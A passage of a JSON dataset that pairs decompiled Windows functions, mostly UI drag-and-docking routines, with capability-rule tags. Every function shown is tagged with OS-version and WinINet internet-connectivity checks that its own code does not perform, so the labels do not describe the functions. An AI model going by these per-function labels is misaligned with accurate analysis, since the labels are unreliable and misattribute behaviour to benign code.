        "decompiled_code": "\nuint __cdecl fcn.0044f050(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint var_4h;\n    \n    uVar2 = 0;\n    cVar1 = fcn.00453390();\n    if (cVar1 != '\\0') {\n        if (*(in_EAX + 0x6a) == '\\0') {\n            fcn.0044efb8(*(in_EAX + 0x74));\n        }\n        uVar2 = fcn.0044f0c4(arg_8h);\n        if (uVar2 != '\\0') {\n            *(in_EAX + 0x7c) = *(**0x492ce0 + 0x44);\n            fcn.0046016c();\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 192
    },
    "0044f0c4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0044f0c4(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t in_EDX;\n    bool bVar3;\n    uint x;\n    uint y;\n    uint var_4h;\n    \n    bVar3 = false;\n    cVar1 = fcn.00453390();\n    if ((cVar1 != '\\0') && (in_EDX != *(in_EAX + 0x6c))) {\n        fcn.0044f128();\n        *(in_EAX + 0x6c) = in_EDX;\n        fcn.0044ef60(&x);\n        iVar2 = sub.comctl32.dll_ImageList_DragEnter(*(in_EAX + 0x6c), x, y);\n        bVar3 = iVar2 != 0;\n    }\n    return bVar3;\n}\n",
        "token_count": 204
    },
    "0044f128": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0044f128(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    cVar1 = fcn.00453390();\n    if ((cVar1 != '\\0') && (*(in_EAX + 0x6c) != 0)) {\n        sub.comctl32.dll_ImageList_DragLeave(*(in_EAX + 0x6c));\n        *(in_EAX + 0x6c) = 0;\n    }\n    return;\n}\n",
        "token_count": 110
    },
    "0044f14c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong fcn.0044f14c(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uStack28;\n    uint *puVar4;\n    uint auStack20 [2];\n    \n    puVar4 = auStack20;\n    cVar1 = fcn.00453390();\n    if (cVar1 == '\\0') {\n        uVar3 = 0;\n    }\n    else {\n        fcn.0044ef60(auStack20);\n        uStack28 = auStack20[0];\n        iVar2 = sub.comctl32.dll_ImageList_DragMove(puVar4);\n        uVar3 = iVar2 != 0;\n    }\n    return CONCAT44(uStack28, uVar3);\n}\n",
        "token_count": 170
    },
    "0044f1c0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool fcn.0044f1c0(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    bool bVar3;\n    \n    cVar1 = fcn.00453390();\n    if ((cVar1 == '\\0') || (*(in_EAX + 0x6a) == '\\0')) {\n        bVar3 = false;\n    }\n    else {\n        fcn.0044f128();\n        iVar2 = sub.comctl32.dll_ImageList_EndDrag();\n        bVar3 = iVar2 != 0;\n        *(in_EAX + 0x6a) = 0;\n        fcn.0044f000();\n        fcn.0046016c();\n    }\n    return bVar3;\n}\n",
        "token_count": 170
    },
    "0044f210": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.0044f210(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    fcn.004483a4();\n    uVar1 = fcn.00421624();\n    *(in_EAX + 0x250) = uVar1;\n    fcn.00443e20();\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 201
    },
    "0044f388": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0044f388(void)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 0x14) == 0) || (*(*(in_EAX + 0x14) + 0x10) == '\\0')) &&\n       ((in_EAX != *(*(in_EAX + 0x1c) + 100) || (*(in_EAX + 0x10) == '\\0')))) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 113
    },
    "0044f440": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0044f440(void)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != *(*(in_EAX + 0x1c) + 100)) {\n        in_EAX = *(in_EAX + 0x14);\n    }\n    if (*(in_EAX + 0x10) != '\\x01') {\n        if (*(in_EAX + 0x10) == '\\x02') {\n            fcn.0044f4d0();\n        }\n        else {\n            fcn.0040c5ac();\n            fcn.004047cc();\n        }\n        return;\n    }\n    fcn.0044f4d0();\n    return;\n}\n",
        "token_count": 154
    },
    "0044f488": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0044f488(void)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != *(*(in_EAX + 0x1c) + 100)) {\n        in_EAX = *(in_EAX + 0x14);\n    }\n    if (*(in_EAX + 0x10) != '\\x01') {\n        if (*(in_EAX + 0x10) == '\\x02') {\n            fcn.0044f554();\n        }\n        else {\n            fcn.0040c5ac();\n            fcn.004047cc();\n        }\n        return;\n    }\n    fcn.0044f554();\n    return;\n}\n",
        "token_count": 150
    },
    "0044f4d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0044f4d0(uint param_1, char param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint uStack32;\n    uint uStack28;\n    \n    iVar1 = in_EAX;\n    while (iVar3 = iVar1,  iVar3 != *(*(in_EAX + 0x1c) + 100)) {\n        iVar1 = *(iVar3 + 0x14);\n        if ((param_2 == *(iVar1 + 0x10)) && (*(iVar3 + 0x18) != 0)) {\n            uVar2 = fcn.0044f928();\n            return uVar2;\n        }\n    }\n    (**(**(*(in_EAX + 0x1c) + 0x14) + 0x44))();\n    (**(**(*(in_EAX + 0x1c) + 0x14) + 0x90))();\n    if (param_2 == '\\x01') {\n        return uStack28;\n    }\n    if (param_2 == '\\x02') {\n        return uStack32;\n    }\n    return 0;\n}\n",
        "token_count": 270
    },
    "0044f554": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0044f554(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iStack32;\n    int32_t iStack28;\n    int32_t iStack24;\n    int32_t iStack20;\n    \n    if ((in_EAX == *(*(in_EAX + 0x1c) + 100)) ||\n       (((iVar2 = in_EAX,  *(*(in_EAX + 0x1c) + 100) == *(in_EAX + 0x14) && (*(in_EAX + 4) != 0)) &&\n        (iVar1 = fcn.0044f3e4(),  iVar1 == 1)))) {\n        (**(**(*(in_EAX + 0x1c) + 0x14) + 0x44))();\n        (**(**(*(in_EAX + 0x1c) + 0x14) + 0x90))();\n        if (param_2 == '\\x01') {\n            iVar2 = iStack20 - iStack28;\n        }\n        else {\n            iVar2 = iStack24 - iStack32;\n        }\n    }\n    else {\n        for (; iVar2 != *(*(in_EAX + 0x1c) + 100); iVar2 = *(iVar2 + 0x14)) {\n            if (param_2 == *(*(iVar2 + 0x14) + 0x10)) {\n                iVar2 = fcn.0044f928();\n                iVar1 = fcn.0044f440();\n                return iVar2 - iVar1;\n            }\n        }\n        if (param_2 == *(*(*(in_EAX + 0x1c) + 100) + 0x10)) {\n            iVar2 = *(*(in_EAX + 0x1c) + 0x68);\n        }\n        else {\n            iVar2 = fcn.0044f928();\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 453
    },
    "0044f60c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.0044f60c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar1 = fcn.0044f3e4();\n    if ((iVar1 != 0) && (*(in_EAX + 0x10) != '\\0')) {\n        iVar2 = fcn.0044fa2c();\n        if (*(in_EAX + 0x10) == '\\x01') {\n            iVar1 = fcn.0044f554();\n        }\n        else if (*(in_EAX + 0x10) == '\\x02') {\n            iVar1 = fcn.0044f554();\n        }\n        else {\n            iVar1 = 0;\n        }\n        iVar3 = fcn.0044f3e4();\n        iVar1 = iVar1 / iVar3;\n        while (iVar2 != 0) {\n            if (*(iVar2 + 0xc) == 0) {\n                fcn.0044f950();\n            }\n            else {\n                fcn.0044f440();\n                fcn.0044f950();\n            }\n            fcn.0044f7ac();\n            iVar1 = fcn.0044fa04();\n            iVar2 = iVar1;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 296
    },
    "0044f6b4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0044f6b4(void)\n\n{\n    int32_t in_EAX;\n    \n    fcn.00404da0();\n    if (*(in_EAX + 4) != 0) {\n        if (*(*(in_EAX + 4) + 8) == 0) {\n            fcn.0040c668();\n            fcn.004047cc();\n        }\n        fcn.00404df4();\n    }\n    return;\n}\n",
        "token_count": 101
    },
    "0044f6f8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Removing unreachable block (ram,0x0044f72d)\n\nuint fcn.0044f6f8(void)\n\n{\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    fcn.00404154();\n    return 0;\n}\n",
        "token_count": 81
    },
    "0044f7ac": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0044f7ac(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint *arg_8h;\n    uint var_14h;\n    int32_t var_4h;\n    \n    iVar2 = *(in_EAX + 4);\n    if (iVar2 == 0) {\n        return;\n    }\n    if (*(iVar2 + 0x57) == '\\0') {\n        return;\n    }\n    if (*(*(in_EAX + 0x1c) + 0x6c) != 0) {\n        return;\n    }\n    *(iVar2 + 0x90) = *(*(in_EAX + 0x14) + 0x10);\n    var_4h = in_EAX;\n    fcn.0044f554();\n    iVar2 = fcn.0044f554();\n    cVar1 = fcn.0044f77c(&stack0xfffffffc);\n    if ((cVar1 != '\\0') && (*(*(var_4h + 0x14) + 0x10) != '\\x01')) {\n        iVar2 = iVar2 - *(*(var_4h + 0x1c) + 0xc);\n    }\n    iVar3 = fcn.0044fa04();\n    if ((iVar3 == 0) &&\n       (((*(var_4h + 0x14) == *(*(var_4h + 0x1c) + 100) ||\n         (*(*(var_4h + 0x14) + 0x10) != *(*(*(var_4h + 0x1c) + 100) + 0x10))) ||\n        (iVar3 = fcn.0044f928(),  *(*(var_4h + 0x1c) + 0x68) <= iVar3)))) {\n        if (*(*(var_4h + 0x14) + 0x10) == *(*(*(var_4h + 0x1c) + 100) + 0x10)) goto code_r0x0044f8d5;\n        iVar3 = fcn.0044f928();\n        iVar4 = fcn.0044f928();\n        if (iVar4 <= iVar3) goto code_r0x0044f8d5;\n    }\n    if (*(*(var_4h + 0x14) + 0x10) == '\\x01') {\n        iVar2 = iVar2 - *(*(var_4h + 0x1c) + 0xc);\n    }\ncode_r0x0044f8d5:\n    arg_8h = &var_14h;\n    uVar5 = fcn.0044f4d0();\n    fcn.0044f4d0(uVar5);\n    fcn.00413abc(arg_8h, iVar2);\n    (****(var_4h + 0x1c))();\n    fcn.00444edc();\n    return;\n}\n",
        "token_count": 686
    },
    "0044fa38": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044fa38(int32_t param_1, char param_2)\n\n{\n    uchar uVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_ch;\n    uint var_5h;\n    \n    if (param_2 != '\\0') {\n        puStack48 = 0x44fa4d;\n        in_EAX = fcn.0040427c();\n        param_1 = extraout_ECX;\n    }\n    puStack48 = 0x44fa60;\n    fcn.00403f28();\n    in_EAX[3] = 4;\n    in_EAX[5] = param_1;\n    in_EAX[0x1c] = 0x80000;\n    in_EAX[6] = 0xc;\n    if ((*(param_1 + 0x5b) == '\\x01') || (*(param_1 + 0x5b) == '\\x02')) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = 1;\n    }\n    *(in_EAX + 7) = uVar1;\n    puStack48 = 0x44fab1;\n    iVar2 = fcn.0044f3ac();\n    in_EAX[0x19] = iVar2;\n    puStack48 = 0x44fac3;\n    iVar2 = fcn.0042132c();\n    in_EAX[4] = iVar2;\n    puStack48 = 0x44fad7;\n    fcn.004285c8();\n    puStack48 = 0x44fae0;\n    fcn.004214a8();\n    puStack48 = 0x44fae8;\n    fcn.0044fc0c();\n    uStack52 = 0x44fb45;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &stack0xfffffffc;\n    iVar2 = fcn.00449558();\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.0044951c(0);\n            (**(*in_EAX + 0xc))();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.0044f60c();\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x44fb4c;\n    uStack52 = 0x44fb44;\n    fcn.0044fc10();\n    return;\n}\n",
        "token_count": 604
    },
    "0044fc10": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0044fc10(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x6c) = *(in_EAX + 0x6c) + -1;\n    if (*(in_EAX + 0x6c) < 1) {\n        *(in_EAX + 0x6c) = 0;\n        fcn.004517b8();\n    }\n    return;\n}\n",
        "token_count": 98
    },
    "0044fc24": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044fc24(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(arg_8h + -4) == *(in_EAX + 4)) {\n        *(arg_8h + -8) = in_EAX;\n        return;\n    }\n    if ((*(arg_8h + -8) == 0) && (*(in_EAX + 0xc) != 0)) {\n        fcn.0044fc24(arg_8h);\n    }\n    if ((*(arg_8h + -8) == 0) && (*(in_EAX + 8) != 0)) {\n        fcn.0044fc24(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 165
    },
    "0044fc7c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0044fc7c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((param_2 != 0) && (*(in_EAX + 100) != 0)) {\n        fcn.0044fc24(&stack0xfffffffc);\n    }\n    return 0;\n}\n",
        "token_count": 94
    },
    "0044fd80": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0044fd80(uint arg_8h)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint8_t in_CL;\n    uint8_t uVar4;\n    int32_t in_EDX;\n    int32_t var_30h;\n    int32_t iStack48;\n    int32_t iStack44;\n    int32_t iStack40;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint8_t var_9h;\n    int32_t var_8h;\n    uint var_1h;\n    \n    if (*(in_EDX + 0x57) != '\\0') {\n        var_1h._0_1_ = in_CL;\n        if (in_EAX[0xe] == 0) {\n            if (*(in_EAX[0x19] + 8) == 0) {\n                (**(*in_EAX[5] + 0x44))();\n                (**(*in_EAX[5] + 0x90))();\n                var_10h = var_14h - var_1ch;\n                if (*(in_EAX[5] + 0x5c) != '\\0') {\n                    if (var_18h == var_20h) {\n                        fcn.0044554c();\n                    }\n                    if (var_10h == 0) {\n                        var_10h = fcn.00445538();\n                    }\n                }\n                fcn.00413abc(&var_30h, var_10h);\n                var_20h = var_30h;\n                var_1ch = iStack48;\n                var_18h = iStack44;\n                var_14h = iStack40;\n                (***in_EAX)();\n                fcn.00444edc();\n                iVar1 = fcn.0044f3ac();\n                iVar2 = in_EAX[0x19];\n                *(iVar2 + 8) = iVar1;\n                *(iVar1 + 0x14) = iVar2;\n                *(iVar1 + 4) = in_EDX;\n            }\n            else {\n                if ((in_CL == 0) || (in_CL == 5)) {\n                    var_1h._0_1_ = 4;\n                }\n                iVar2 = fcn.0044fc7c();\n                if (iVar2 != 0) {\n                    fcn.00450ed0();\n                }\n                var_8h = fcn.0044fc7c();\n                var_9h = *(var_1h + 0x4916ec);\n                iVar2 = fcn.0044f3d0();\n                if (iVar2 == 1) {\n                    *(in_EAX[0x19] + 0x10) = var_9h;\n                    if (var_9h == 1) {\n                        fcn.0044f554();\n                        fcn.0044f950();\n                        uVar3 = fcn.0044f554();\n                        in_EAX[0x1a] = uVar3;\n                    }\n                    else if (var_9h == 2) {\n                        fcn.0044f554();\n                        fcn.0044f950();\n                        uVar3 = fcn.0044f554();\n                        in_EAX[0x1a] = uVar3;\n                    }\n                }\n                iVar2 = fcn.0044f3ac();\n                *(iVar2 + 4) = in_EDX;\n                if (var_8h == 0) {\n                    uVar4 = *(in_EAX[0x19] + 0x10);\n                }\n                else {\n                    uVar4 = *(*(var_8h + 0x14) + 0x10);\n                }\n                if (var_9h == 0) {\n                    var_9h = uVar4;\n                }\n                if (uVar4 == var_9h) {\n                    fcn.00450144(*(var_1h + 0x4916f4));\n                }\n                else {\n                    fcn.0044ff9c(*(var_1h + 0x4916f4), var_9h);\n                }\n            }\n        }\n        else {\n            *(in_EAX[0xe] + 4) = in_EDX;\n            fcn.0044f7ac();\n        }\n        (**(*in_EAX[5] + 0x80))();\n    }\n    return;\n}\n",
        "token_count": 1042
    },
    "0044ff9c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044ff9c(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint var_4h;\n    \n    iVar2 = fcn.0044f3ac();\n    *(iVar2 + 0x10) = arg_ch;\n    if (in_ECX == 0) {\n        fcn.0044f950();\n        uVar3 = fcn.0044f928();\n        *(in_EAX + 0x68) = uVar3;\n        *(in_EAX + 0x48) = arg_ch;\n        *(in_EAX + 0x40) = 0;\n        *(in_EAX + 0x44) = 0x3fe00000;\n        if (arg_8h == '\\0') {\n            *(iVar2 + 8) = in_EDX;\n            iVar1 = *(in_EAX + 100);\n            *(iVar1 + 0x14) = iVar2;\n            *(iVar1 + 0x18) = in_EDX;\n            *(in_EDX + 0xc) = iVar1;\n            *(in_EDX + 0x14) = iVar2;\n            *(in_EAX + 100) = iVar2;\n            fcn.0044fce4(0x451258);\n            uVar4 = fcn.0044f928();\n            iVar2 = uVar4 >> 1;\n            if (iVar2 < 0) {\n                iVar2 = iVar2 + ((uVar4 & 1) != 0);\n            }\n            *(in_EAX + 0x4c) = iVar2;\n            fcn.0044fce4(0x4516a8);\n            fcn.0044f928();\n            fcn.0044f950();\n        }\n        else {\n            *(iVar2 + 8) = *(in_EAX + 100);\n            iVar1 = *(in_EAX + 100);\n            *(iVar1 + 0x14) = iVar2;\n            *(iVar1 + 0xc) = in_EDX;\n            *(in_EDX + 0x18) = iVar1;\n            *(in_EDX + 0x14) = iVar2;\n            *(in_EAX + 100) = iVar2;\n            fcn.0044fce4(0x451258);\n        }\n        fcn.0044fce4(0x4517e0);\n    }\n    else {\n        fcn.0044f928();\n        fcn.0044f950();\n        *(iVar2 + 0x14) = *(in_ECX + 0x14);\n        iVar1 = *(in_ECX + 0x18);\n        *(iVar2 + 0x18) = iVar1;\n        if (iVar1 != 0) {\n            *(iVar1 + 0xc) = iVar2;\n        }\n        iVar1 = *(in_ECX + 0xc);\n        *(iVar2 + 0xc) = iVar1;\n        if (iVar1 != 0) {\n            *(iVar1 + 0x18) = iVar2;\n        }\n        if (in_ECX == *(*(iVar2 + 0x14) + 8)) {\n            *(*(iVar2 + 0x14) + 8) = iVar2;\n        }\n        *(in_EDX + 0x14) = iVar2;\n        *(in_ECX + 0x14) = iVar2;\n        if (arg_8h == '\\0') {\n            *(iVar2 + 8) = in_EDX;\n            *(in_ECX + 0x18) = in_EDX;\n            *(in_ECX + 0xc) = 0;\n            *(in_EDX + 0xc) = in_ECX;\n        }\n        else {\n            *(iVar2 + 8) = in_ECX;\n            *(in_ECX + 0x18) = 0;\n            *(in_ECX + 0xc) = in_EDX;\n            *(in_EDX + 0x18) = in_ECX;\n        }\n    }\n    fcn.0044f60c();\n    fcn.0044f9a4();\n    fcn.0044fce4(0x4517e0);\n    return;\n}\n",
        "token_count": 974
    },
    "004501bc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.004501bc(uint *arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    int32_t in_EDX;\n    uint var_ch;\n    uchar var_5h;\n    uint var_4h;\n    \n    var_5h = 0;\n    iVar1 = fcn.0044f4d0();\n    iVar2 = fcn.0044f4d0();\n    if (*(in_EAX + 0x1c) == '\\0') {\n        if (((iVar2 <= *in_ECX) && (*in_ECX <= *(in_EAX + 0x18) + iVar2)) && (iVar1 <= in_ECX[1])) {\n            iVar2 = fcn.0044f554();\n            if (in_ECX[1] <= iVar1 + iVar2) {\n                var_5h = 1;\n                if (in_ECX[1] < *(*(in_EDX + 4) + 0x44) + 0xf) {\n                    *arg_8h = 0x14;\n                }\n                else {\n                    *arg_8h = 2;\n                }\n            }\n        }\n    }\n    else if (((iVar1 <= in_ECX[1]) && (in_ECX[1] <= iVar1 + *(in_EAX + 0x18))) && (iVar2 <= *in_ECX)) {\n        iVar1 = fcn.0044f554();\n        if (*in_ECX <= iVar1 + iVar2) {\n            var_5h = 1;\n            if (*(*(in_EDX + 4) + 0x40) + *(*(in_EDX + 4) + 0x48) + -0xf < *in_ECX) {\n                *arg_8h = 0x14;\n            }\n            else {\n                *arg_8h = 2;\n            }\n        }\n    }\n    return var_5h;\n}\n",
        "token_count": 445
    },
    "004502c0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t * fcn.004502c0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uchar *puStack40;\n    uint uStack36;\n    uchar auStack20 [4];\n    \n    iVar2 = fcn.00449558();\n    iVar2 = iVar2 + -1;\n    if (-1 < iVar2) {\n        do {\n            piVar3 = fcn.0044951c();\n            if ((*(piVar3 + 0x57) != '\\0') && ((cVar1 = fcn.004040e4(),  cVar1 == '\\0' || (*(piVar3 + 0x1da) != '\\0'))))\n            {\n                fcn.00413a6c();\n                (**(*piVar3 + 0x44))(puStack40, uStack36);\n                puStack40 = auStack20;\n                iVar4 = sub.user32.dll_PtInRect();\n                if (iVar4 != 0) {\n                    return piVar3;\n                }\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    return NULL;\n}\n",
        "token_count": 269
    },
    "0045034c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045034c(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    if (*(*(in_EAX + 0x14) + 0x10) == '\\x01') {\n        iVar2 = fcn.0044f928();\n        if (*(*(arg_8h + -4) + 4) <= iVar2) {\n            iVar2 = fcn.0044f928();\n            if (iVar2 - *(*(arg_8h + -8) + 0xc) <= *(*(arg_8h + -4) + 4)) {\n                **(arg_8h + -0xc) = 0x12;\n                *(arg_8h + -0x10) = in_EAX;\n                goto code_r0x0045040f;\n            }\n        }\n    }\n    if (*(*(in_EAX + 0x14) + 0x10) == '\\x02') {\n        iVar2 = fcn.0044f928();\n        if (**(arg_8h + -4) <= iVar2) {\n            iVar2 = fcn.0044f928();\n            if (iVar2 - *(*(arg_8h + -8) + 0xc) <= **(arg_8h + -4)) {\n                **(arg_8h + -0xc) = 0x12;\n                *(arg_8h + -0x10) = in_EAX;\n                goto code_r0x0045040f;\n            }\n        }\n    }\n    if (*(in_EAX + 4) != 0) {\n        cVar1 = (**(**(arg_8h + -8) + 0x40))(*(arg_8h + -0xc));\n        if (cVar1 != '\\0') {\n            *(arg_8h + 